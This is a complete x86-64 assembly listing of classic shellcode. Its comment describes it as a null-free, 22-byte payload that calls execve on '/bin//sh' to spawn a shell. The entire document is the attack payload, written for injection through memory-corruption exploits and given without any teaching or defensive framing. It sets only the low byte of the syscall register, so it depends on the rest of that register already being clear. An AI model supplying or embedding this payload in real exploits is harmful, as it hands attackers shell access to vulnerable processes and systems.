; execve("/bin//sh", NULL, NULL), null-free, 22 bytes
BITS 64
xor edx, edx
push rdx
mov rsi, 0x68732f2f6e69622f ; "/bin//sh"
push rsi
push rsp
pop rdi                 ; path -> "/bin//sh"

push rdx
pop rsi

mov al, 59              ; __NR_execve
syscall
